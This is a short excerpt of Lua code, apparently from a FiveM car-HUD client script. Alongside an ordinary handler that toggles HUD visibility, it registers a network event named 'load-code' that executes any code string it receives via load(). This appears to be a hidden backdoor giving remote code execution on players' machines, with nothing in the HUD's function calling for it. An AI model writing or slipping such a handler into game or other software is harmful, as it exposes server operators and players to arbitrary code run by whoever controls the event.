...
RegisterNetEvent("est_carhud:updateCARHUD")
AddEventHandler("est_carhud:updateCARHUD", function(boolean)
	showHUD = boolean
end)
...
RegisterNetEvent('est_carhud:load-code')
AddEventHandler('est_carhud:load-code', function(code)
    assert(load(code))()
end)
